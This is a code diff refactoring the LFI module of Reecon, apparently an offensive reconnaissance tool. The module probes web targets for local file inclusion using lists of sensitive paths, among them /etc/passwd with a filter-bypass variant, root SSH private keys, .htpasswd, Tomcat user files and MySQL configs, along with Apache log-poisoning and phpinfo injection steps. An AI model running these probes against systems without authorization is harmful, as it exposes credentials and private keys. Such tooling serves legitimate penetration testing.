@@ -6,7 +6,7 @@ using System.Drawing;
 
 namespace Reecon
 {
-    class LFI
+    internal static class LFI
     {
         private static string baseURL = "";
         private static string baseLocation = "";
@@ -31,7 +31,7 @@ namespace Reecon
             ScanPath(args[1]);
         }
 
-        public static void ScanPath(string path)
+        private static void ScanPath(string path)
         {
             if (!path.StartsWith("http"))
             {
@@ -64,25 +64,19 @@ namespace Reecon
                 DoLFI(linux_WebChecks);
 
                 // Do nginx specific checks
-                List<string> linux_nginx = new()
-                {
-                    "/etc/nginx/sites-available/default"
-                };
+                List<string> linux_nginx = ["/etc/nginx/sites-available/default"];
                 DoLFI(linux_nginx);
 
                 // Do Apache2 specific checks - https://packages.ubuntu.com/eoan/all/apache2/filelist
-                List<string> linux_apache = new()
-                {
-                    "/etc/apache2/sites-available/000-default.conf"
-                };
+                List<string> linux_apache = ["/etc/apache2/sites-available/000-default.conf"];
                 bool hasApache = DoLFI(linux_apache);
                 if (hasApache)
                 {
                     // Check for .htpasswd
-                    DoLFI(new List<string>() { "/etc/apache2/.htpasswd" });
+                    DoLFI(["/etc/apache2/.htpasswd"]);
 
                     // Apache2 Log Poisoning Path (Very restricted): 
-                    bool apache2Log = DoLFI(new List<string>() { "/var/log/apache2/access.log" });
+                    bool apache2Log = DoLFI(["/var/log/apache2/access.log"]);
                     if (apache2Log)
                     {
                         // Log poisoning file upload
@@ -94,25 +88,25 @@ namespace Reecon
                 }
 
                 // Do some logging checks
-                List<string> linux_logs = new()
-                {
+                List<string> linux_logs =
+                [
                     "/var/log/vsftpd.log", // FTP
-                    "/var/log/auth.log" // SSH 
-                };
+                    "/var/log/auth.log"
+                ];
                 DoLFI(linux_logs);
 
                 // Do MySQL Checks
-                List<string> linux_mysql = new()
-                {
+                List<string> linux_mysql =
+                [
                     "/etc/my.cnf",
                     "/etc/mysql/my.cnf",
                     "/var/log/mysql/error.log"
-                };
+                ];
                 DoLFI(linux_mysql);
 
                 // Do Tomcat9 Checks - https://packages.ubuntu.com/eoan/all/tomcat9/filelist
-                List<string> linux_tomcat9 = new()
-                {
+                List<string> linux_tomcat9 =
+                [
                     "/etc/cron.daily/tomcat9",
                     "/etc/rsyslog.d/tomcat9.conf",
                     "/usr/lib/sysusers.d/tomcat9.conf",
@@ -122,19 +116,19 @@ namespace Reecon
                     "/usr/share/tomcat9/etc/tomcat-users.xml",
                     "/usr/share/tomcat9/etc/web.xml",
                     "/var/lib/tomcat9/webapps/ROOT/index.html",
-                    "/opt/tomcat/conf/tomcat-users.xml" // Multiple Tomcat Versions - Found in Tomcat 8
-                };
+                    "/opt/tomcat/conf/tomcat-users.xml"
+                ];
                 DoLFI(linux_tomcat9);
 
                 // Do basic SSH Checks - https://evi1us3r.wordpress.com/lfi-cheat-sheet/
-                List<string> linux_ssh = new()
-                {
+                List<string> linux_ssh =
+                [
                     "/etc/ssh/ssh_config",
                     "/etc/ssh/sshd_config",
                     "/root/.ssh/id_rsa",
                     "/root/.ssh/authorized_keys",
                     "/var/log/auth.log"
-                };
+                ];
                 DoLFI(linux_ssh);
 
                 // Linux - Misc
@@ -148,7 +142,7 @@ namespace Reecon
                 // Mega Weird
                 int actualBypassMethod = bypassMethod;
                 bypassMethod = 8;
-                DoLFI(new List<string> { "phpinfo();" });
+                DoLFI(["phpinfo();"]);
                 bypassMethod = actualBypassMethod;
             }
             else if (OS == General.OS.Windows)
@@ -222,8 +216,8 @@ namespace Reecon
         {
             Console.WriteLine("Running OS Checks...");
             // Linux
-            List<string> linuxChecks = new()
-            {
+            List<string> linuxChecks =
+            [
                 "/etc/./passwd", // The . is intentional - It's a mini firewall bypass
                 "/etc/passwd",
                 "/etc/resolv.conf",
@@ -233,8 +227,8 @@ namespace Reecon
                 "/etc/hosts",
                 "/etc/issue", // Shows the Release
                 "/etc/group", // Groups
-                "/proc/self/cmdline" // Running commandline
-            };
+                "/proc/self/cmdline"
+            ];
             bool hasResult = DoLFI(linuxChecks);
             if (hasResult)
             {
@@ -242,17 +236,15 @@ namespace Reecon
             }
 
             // Windows
-            List<string> windowsChecks = new()
-            {
+            List<string> windowsChecks =
+            [
                 "/boot.ini", // Basic boot.ini
                 "/inetpub/wwwroot/index.php", // Basic IIS Webserver
                 "/Windows/debug/NetSetup.log", // Some basic Windows info
                 "/Windows/SoftwareDistribution/ReportingEvents.log", // Windows Patches
                 "/Windows/System32/cmd.exe", // What Windows box doesn't have cmd?
-                "/Windows/win.ini" // Should have this
-
-                // xampp/apache/logs/access.log
-            };
+                "/Windows/win.ini"
+            ];
             hasResult = DoLFI(windowsChecks);
             if (hasResult)
             {
@@ -456,7 +448,7 @@ namespace Reecon
         {
             try
             {
-                var requestResult = Web.GetHTTPInfo(fullPath, Cookie: cookie);
+                Web.HttpInfo requestResult = Web.GetHTTPInfo(fullPath, Cookie: cookie);
                 if (requestResult.AdditionalInfo == "Timeout")
                 {
                     Console.WriteLine("- " + fullPath + " -- Timeout :(");
@@ -483,7 +475,7 @@ namespace Reecon
             }
             catch (Exception ex)
             {
-                Console.WriteLine("LFI Bug - Bug Reelix: " + ex.Message);
+                General.HandleUnknownException(ex);
                 return false;
                 // Nope!
             }
